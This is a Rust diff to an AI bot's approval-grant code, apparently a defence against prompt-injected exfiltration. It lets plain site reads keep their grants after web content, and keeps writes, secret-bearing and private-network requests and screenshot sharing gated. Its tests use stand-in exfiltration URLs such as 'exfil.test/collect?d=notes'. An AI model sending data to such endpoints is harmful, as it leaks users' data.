@@ -27,7 +27,10 @@
 //! The document cost check is the grant `(documents, documents.expensive)`.
 //!
 //! Once a round begins with web content in the model's context, standing grants do not cover a
-//! call whose scopes name a web destination ([`web_scoped`]): it asks again. A headless attempt
+//! call whose scopes name a web destination ([`web_scoped`]): it asks again. A plain read of a
+//! public site ([`site_reads_only`]) is exempt and runs on any grant that covers it, auto approval
+//! included: a GET after web content asking on every new host made auto approval useless, while
+//! `shell_run` and `code_run` reach the same hosts under auto approval anyway. A headless attempt
 //! collects every call of its round that asks into one [`ParkedBatch`] card.
 
 use async_trait::async_trait;
@@ -72,7 +75,7 @@ const CONFIGURATION_TOOLS: [&str; 4] = [
 const WEB_SCOPE_PREFIXES: [&str; 3] = ["web:", "browser:", "owner_browser:"];
 
 /// The `asks_again` reason a live chat's approval prompt carries when [`grant_set_aside`] holds:
-/// the prompt offers no "don't ask again".
+/// auto mode does not waive it, and only a plain site read may be remembered.
 pub const ASKS_AGAIN_WEB_CONTENT: &str = "web_content";
 
 /// One stored `(tool, scope)` pair.
@@ -174,7 +177,7 @@ fn connection_scope(args: &Value) -> Option<String> {
 /// The grant scopes that cover one call of `tool`, or `None` when the call is never remembered.
 /// A call is covered when every scope is granted (or the tool is granted for `*`).
 pub fn grant_scopes(tool: &str, args: &Value, context_app: Option<&str>) -> Option<Vec<String>> {
-    if NOT_GRANTABLE.contains(&tool) {
+    if NOT_GRANTABLE.contains(&tool) || tools::computer::room_show(tool, args).is_some() {
         return None;
     }
     let one = |scope: Option<String>| scope.map(|scope| vec![scope]);
@@ -207,7 +210,7 @@ pub fn grant_scopes(tool: &str, args: &Value, context_app: Option<&str>) -> Opti
             })
         }
         "data_sources" => one(connection_scope(args)),
-        "connector_call" | "connector_request" => {
+        _ if flow_like_bot_tools::services::POLICY_TOOLS.contains(&tool) => {
             one(flow_like_bot_tools::services::grant_scope(tool, args))
         }
         "browser_open" => one(clean(arg(args, "url", "url"))
@@ -246,9 +249,21 @@ pub fn web_scoped(tool: &str, args: &Value) -> bool {
 }
 
 /// Whether standing grants are set aside for this call: its round began with web content in the
-/// model's context and it reaches a web destination.
+/// model's context and it reaches a web destination other than a plain site read
+/// ([`site_reads_only`]).
 pub fn grant_set_aside(tool: &str, args: &Value) -> bool {
-    super::run_recovery::round_has_web_content() && web_scoped(tool, args)
+    super::run_recovery::round_has_web_content()
+        && web_scoped(tool, args)
+        && !grant_scopes(tool, args, None).is_some_and(|scopes| site_reads_only(&scopes))
+}
+
+/// Whether every scope is the plain read of a public site (`web:<site>:read`: no write, secret
+/// or private network), the one web destination whose grants survive web content.
+pub fn site_reads_only<S: AsRef<str>>(scopes: &[S]) -> bool {
+    !scopes.is_empty()
+        && scopes
+            .iter()
+            .all(|scope| tools::web::is_site_read_scope(scope.as_ref()))
 }
 
 /// What the stores say about one call that asks.
@@ -272,7 +287,8 @@ impl GrantCheck {
     }
 }
 
-/// `auto`: the call is one the auto-approval grant may cover (never a deletion or a setting).
+/// The grants that cover a call; `auto`: the auto-approval grant may (never a deletion or a
+/// setting).
 fn covering_grants(
     keys: &[GrantKey],
     tool: &str,
@@ -315,7 +331,8 @@ async fn match_call(
     }
     let set_aside = grant_set_aside(tool, args);
     let mut keys = None;
-    if !set_aside && let Some(scopes) = grant_scopes(tool, args, context_app) {
+    let scopes = grant_scopes(tool, args, context_app).filter(|_| !set_aside);
+    if let Some(scopes) = scopes {
         let listed = store.list().await?;
         let auto = permits_authorization_inference(tool, args);
         if let Some(used) = covering_grants(&listed, tool, &scopes, auto) {
@@ -511,6 +528,7 @@ pub fn approval_request(
         invite: (tool == ROOM_INVITE_TOOL)
             .then(|| tools::rooms::invite_ask(args))
             .flatten(),
+        picture: tools::computer::room_show(tool, args).map(|show| show.file),
         configuration_changes: tools::configuration::proposed_changes(tool, args),
         items: Vec::new(),
     }
@@ -553,6 +571,7 @@ pub async fn headless_answer(
 /// Document cost approvals use their separate gate and never reach inference.
 pub fn permits_authorization_inference(tool: &str, args: &Value) -> bool {
     !NOT_GRANTABLE.contains(&tool)
+        && tools::computer::room_show(tool, args).is_none()
         && tool != DOCUMENTS_TOOL
         && tool != "knowledge_drop"
         && !(tool == "database_tool" && arg(args, "operation", "operation") == "delete_table")
@@ -666,9 +685,12 @@ impl BatchEntry {
             after_web_content: self.after_web_content,
             secret: self.card.secret.clone(),
             invite: self.card.invite.clone(),
+            picture: self.card.picture.clone(),
         }
     }
 
+    /// A call asked again after web content is answered for this turn only: an "always" would not
+    /// cover it the next time either.
     fn rememberable(&self) -> bool {
         !self.after_web_content
             && !self.card.scope.is_empty()
@@ -746,6 +768,7 @@ fn batch_card(turn_id: &str, entries: &[BatchEntry]) -> Option<ApprovalRequest> 
         room: None,
         secret: None,
         invite: None,
+        picture: None,
         configuration_changes: None,
         items,
     })
@@ -1398,23 +1421,153 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn auto_approval_asks_again_for_web_destinations_after_web_content() {
+    async fn auto_approval_covers_site_reads_but_not_web_writes_after_web_content() {
         let store = auto_store();
-        let args = fetch("https://exfil.test/collect");
-        let checked = scope_call(call_scope("c1", true), async {
-            check_call(&store, "web_request", &args, None)
-                .await
-                .unwrap()
-        })
+        let read = fetch("https://crates.io/api/v1/crates/zstd/0.13.5/dependencies");
+        let write = json!({ "url": "https://exfil.test/collect", "method": "POST" });
+        let keyed = json!({
+            "url": "https://api.osv.dev/v1/vulns/x",
+            "headers": { "Authorization": "Bearer {{secret:OSV_TOKEN}}" },
+        });
+        let private = json!({ "url": "https://router.local/status", "allow_private": true });
+        let browse = json!({ "url": "https://shop.example/cart" });
+        let download =
+            json!({ "url": "https://static.crates.io/zstd.crate", "path": "zstd.crate" });
+        let check = |id: &'static str, marked: bool, tool: &'static str, args: &Value| {
+            let args = args.clone();
+            let store = &store;
+            scope_call(call_scope(id, marked), async move {
+                check_call(store, tool, &args, None).await.unwrap()
+            })
+        };
+
+        assert!(!grant_set_aside("web_request", &read));
+        assert_eq!(
+            check("c1", true, "web_request", &read).await,
+            GrantCheck::Granted
+        );
+        assert_eq!(
+            check("c2", true, "file_save", &download).await,
+            GrantCheck::Granted
+        );
+        for (id, tool, args) in [
+            ("c3", "web_request", &write),
+            ("c4", "web_request", &keyed),
+            ("c5", "web_request", &private),
+            ("c6", "browser_open", &browse),
+        ] {
+            assert_eq!(
+                check(id, true, tool, args).await,
+                GrantCheck::SetAside,
+                "{args}"
+            );
+            assert_eq!(
+                check(id, false, tool, args).await,
+                GrantCheck::Granted,
+                "{args}"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn a_site_read_after_web_content_runs_on_any_grant_that_covers_it() {
+        let store = Memory::default();
+        let osv = fetch("https://api.osv.dev/v1/vulns/RUSTSEC-2026-0589");
+        let osv_site = grant_scopes("web_request", &osv, None).unwrap();
+        assert_eq!(osv_site, vec!["web:api.osv.dev:read".to_string()]);
+        store.put("web_request", &osv_site[0]).await.unwrap();
+        let other = fetch("https://exfil.test/collect?d=notes");
+        let write = json!({ "url": "https://api.osv.dev/v1/query", "method": "POST" });
+        for scope in grant_scopes("web_request", &write, None).unwrap() {
+            store.put("web_request", &scope).await.unwrap();
+        }
+        let marked = |id: &'static str| call_scope(id, true);
+        let check = |args: &Value| {
+            let args = args.clone();
+            let store = &store;
+            async move { check_call(store, "web_request", &args, None).await.unwrap() }
+        };
+
+        assert_eq!(
+            scope_call(marked("c1"), check(&osv)).await,
+            GrantCheck::Granted
+        );
+        assert_eq!(
+            scope_call(marked("c2"), check(&other)).await,
+            GrantCheck::Missing,
+            "an ungranted read asks as it would without web content"
+        );
+        assert_eq!(
+            scope_call(marked("c3"), check(&write)).await,
+            GrantCheck::SetAside
+        );
+
+        store.put("web_request", SCOPE_ALL).await.unwrap();
+        assert_eq!(
+            scope_call(marked("c4"), check(&other)).await,
+            GrantCheck::Granted
+        );
+        assert_eq!(
+            scope_call(marked("c5"), check(&write)).await,
+            GrantCheck::SetAside
+        );
+    }
+
+    #[tokio::test]
+    async fn a_site_read_after_web_content_asks_as_usual_and_a_write_is_flagged() {
+        let store = Memory::default();
+        let read = fetch("https://api.github.com/advisories?per_page=20");
+        let read_site = grant_scopes("web_request", &read, None).unwrap().remove(0);
+        let write = json!({ "url": "https://hooks.example/notify", "method": "POST" });
+        let marked = |id: &'static str| call_scope(id, true);
+
+        let alone = ParkedBatch::new("bt_read");
+        let parked = scope_call(
+            marked("c1"),
+            alone.answer(&store, "web_request", &read, None, "Read advisories", None),
+        )
         .await;
-        assert_eq!(checked, GrantCheck::SetAside);
-        let plain = scope_call(call_scope("c2", false), async {
-            check_call(&store, "web_request", &args, None)
-                .await
-                .unwrap()
-        })
-        .await;
-        assert_eq!(plain, GrantCheck::Granted);
+        assert!(matches!(parked, HeadlessAnswer::Park(_)));
+        let card = alone.card().unwrap();
+        assert_eq!(card.scope, read_site);
+        assert!(card.items.is_empty(), "a plain card, not a flagged item");
+
+        let mixed = ParkedBatch::new("bt_mixed");
+        for (id, args) in [("c2", &read), ("c3", &write)] {
+            scope_call(
+                marked(id),
+                mixed.answer(&store, "web_request", args, None, "Call", None),
+            )
+            .await;
+        }
+        let card = mixed.card().unwrap();
+        assert_eq!(card.tool, APPROVAL_BATCH_TOOL);
+        assert_eq!(card.scope, "", "the write can't be remembered");
+        let flags: Vec<bool> = card
+            .items
+            .iter()
+            .map(|item| item.after_web_content)
+            .collect();
+        assert_eq!(flags, vec![false, true]);
+
+        let answer = ApprovalAnswer {
+            approval_id: alone.card().unwrap().id,
+            decision: ApprovalDecision::Always,
+            items: Vec::new(),
+        };
+        record_batch_answer(&store, &alone.card().unwrap(), &answer)
+            .await
+            .unwrap();
+        let later = fetch("https://api.github.com/advisories?per_page=50");
+        assert_eq!(
+            scope_call(marked("c4"), async {
+                check_call(&store, "web_request", &later, None)
+                    .await
+                    .unwrap()
+            })
+            .await,
+            GrantCheck::Granted
+        );
     }
 
     fn call_scope(id: &str, round_web_content: bool) -> CallScope {
@@ -1779,10 +1932,10 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn a_web_grant_is_set_aside_after_web_content() {
+    async fn a_web_write_grant_is_set_aside_after_web_content() {
         let store = Memory::default();
-        let feed = fetch("https://www.cisa.gov/feeds/kev.xml");
-        let site = grant_scopes("web_request", &feed, None).unwrap()[0].clone();
+        let report = json!({ "url": "https://www.cisa.gov/report", "method": "POST" });
+        let site = grant_scopes("web_request", &report, None).unwrap()[0].clone();
         let browse = json!({"url": "https://shop.example/cart"});
         let app = json!({"app_id": "a1", "event_id": "e"});
         store.put("web_request", &site).await.unwrap();
@@ -1795,11 +1948,11 @@ mod tests {
             async move { check_call(store, tool, &args, None).await.unwrap() }
         };
 
-        assert_eq!(check("web_request", &feed).await, GrantCheck::Granted);
-        assert!(!grant_set_aside("web_request", &feed));
+        assert_eq!(check("web_request", &report).await, GrantCheck::Granted);
+        assert!(!grant_set_aside("web_request", &report));
         store.1.lock().unwrap().clear();
         assert_eq!(
-            scope_call(marked("c1"), check("web_request", &feed)).await,
+            scope_call(marked("c1"), check("web_request", &report)).await,
             GrantCheck::SetAside
         );
         assert_eq!(
@@ -1813,7 +1966,7 @@ mod tests {
         );
         assert!(
             scope_call(marked("c1"), async {
-                grant_set_aside("web_request", &feed)
+                grant_set_aside("web_request", &report)
             })
             .await
         );
@@ -1825,36 +1978,36 @@ mod tests {
         );
         assert!(web_scoped("browser_open", &browse) && !web_scoped("call_app_event", &app));
 
-        record_answer(&store, "web_request", &feed, None, ApprovalDecision::Once)
+        record_answer(&store, "web_request", &report, None, ApprovalDecision::Once)
             .await
             .unwrap();
         assert_eq!(
-            scope_call(marked("c1"), check("web_request", &feed)).await,
+            scope_call(marked("c1"), check("web_request", &report)).await,
             GrantCheck::Once
         );
-        record_answer(&store, "web_request", &feed, None, ApprovalDecision::Once)
+        record_answer(&store, "web_request", &report, None, ApprovalDecision::Once)
             .await
             .unwrap();
-        record_answer(&store, "web_request", &feed, None, ApprovalDecision::Deny)
+        record_answer(&store, "web_request", &report, None, ApprovalDecision::Deny)
             .await
             .unwrap();
         assert_eq!(
-            scope_call(marked("c1"), check("web_request", &feed)).await,
+            scope_call(marked("c1"), check("web_request", &report)).await,
             GrantCheck::Denied
         );
         store
             .delete(
                 "web_request",
-                &token(ONCE_PREFIX, "web_request", &feed).scope,
+                &token(ONCE_PREFIX, "web_request", &report).scope,
             )
             .await
             .unwrap();
 
         let batch = ParkedBatch::new("bt_1");
-        let description = "The bot wants to send a GET request to cisa.gov/feeds/kev.xml.";
+        let description = "The bot wants to send a POST request to cisa.gov/report.";
         let parked = scope_call(
             marked("c2"),
-            batch.answer(&store, "web_request", &feed, None, description, None),
+            batch.answer(&store, "web_request", &report, None, description, None),
         )
         .await;
         assert!(matches!(parked, HeadlessAnswer::Park(_)));
@@ -1865,7 +2018,7 @@ mod tests {
         );
         assert_eq!(
             card.id,
-            approval_message_id("bt_1", &args_hash("web_request", &feed))
+            approval_message_id("bt_1", &args_hash("web_request", &report))
         );
         assert_eq!(card.items.len(), 1);
         assert!(card.items[0].after_web_content);
@@ -1884,7 +2037,7 @@ mod tests {
             batch.answer(
                 &store,
                 "web_request",
-                &feed,
+                &report,
                 None,
                 description,
                 Some(&inference),
@@ -2050,6 +2203,10 @@ mod tests {
             (
                 "file_save",
                 json!({"url": "https://files.example.com/a.pdf"}),
+            ),
+            (
+                "calendar_create",
+                json!({"calendar": "c-google", "policy": "ask"}),
             ),
             ("some_tool", json!({})),
         ];
@@ -2443,6 +2600,61 @@ mod tests {
             approval_request("bt_1", "code_run", &args, None, "x").secret,
             None
         );
+    }
+
+    #[tokio::test]
+    async fn a_computer_session_grant_never_shows_a_screenshot_in_a_room() {
+        let store = Memory::default();
+        let look = json!({ "keep": true });
+        let HeadlessAnswer::Park(card) =
+            headless_answer(&store, "bt_1", "computer_screenshot", &look, None, "Look").await
+        else {
+            panic!("expected a park");
+        };
+        record_card_answer(&store, &card, ApprovalDecision::Always)
+            .await
+            .unwrap();
+        assert_eq!(
+            headless_answer(&store, "bt_2", "computer_screenshot", &look, None, "").await,
+            HeadlessAnswer::Run
+        );
+
+        let file = flow_like_types::bot_message::WorkspaceHandle {
+            app_id: "ws1".into(),
+            path: "bot/screenshots/a.png".into(),
+            bytes: 4,
+            sha256: "a".repeat(64),
+            mime: "image/png".into(),
+        };
+        let show = tools::computer::show_in_room_args(&file, Some("Team"));
+        let HeadlessAnswer::Park(card) = headless_answer(
+            &store,
+            "bt_2",
+            "computer_screenshot",
+            &show,
+            None,
+            "The bot wants to show the people in “Team” this screenshot of your computer.",
+        )
+        .await
+        else {
+            panic!("a standing grant covered a room show");
+        };
+        assert_eq!(card.scope, "");
+        assert_eq!(card.picture, Some(file));
+        assert!(
+            card.invite.is_none()
+                && approval_request("bt_2", "computer_screenshot", &look, None, "")
+                    .picture
+                    .is_none()
+        );
+        assert!(!permits_authorization_inference(
+            "computer_screenshot",
+            &show
+        ));
+        assert!(permits_authorization_inference(
+            "computer_screenshot",
+            &look
+        ));
     }
 
     #[tokio::test]
